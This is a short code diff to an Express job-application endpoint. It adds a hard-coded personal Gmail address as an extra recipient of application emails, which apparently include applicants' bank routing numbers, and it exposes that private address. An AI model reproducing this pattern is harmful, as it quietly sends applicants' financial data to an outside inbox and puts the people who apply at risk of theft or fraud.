@@ -55,7 +55,13 @@ app.post("/apply", upload.fields([
 
     const mailOptions = {
       from: process.env.EMAIL_USER,
-      to: process.env.EMAIL_USER,
+
+      // 🔥 MULTIPLE EMAILS HERE
+      to: [
+        process.env.EMAIL_USER,
+        "A.trejoa99@gmail.com"
+      ],
+
       subject: "New Job Application",
 
       text: `
@@ -108,7 +114,7 @@ Routing Number: ${data.routingNumber}
 
     await transporter.sendMail(mailOptions);
 
-    console.log("EMAIL SENT ✅");
+    console.log("EMAIL SENT TO MULTIPLE RECIPIENTS ✅");
 
     res.json({ message: "Application sent successfully 📩" });
 
